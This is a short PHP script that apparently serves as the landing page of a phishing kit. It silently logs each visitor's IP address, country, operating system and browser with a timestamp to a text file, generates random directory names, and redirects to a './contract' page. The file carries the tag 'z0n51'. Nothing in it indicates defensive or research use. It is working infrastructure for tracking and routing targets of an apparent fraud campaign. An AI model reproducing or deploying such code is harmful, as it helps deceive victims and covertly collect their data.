<?php
include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country();
$get_user_countrycode = get_user_countrycode();
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
$home="z0n51";
$file = fopen("vusss.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");
header("location: ./contract");
?>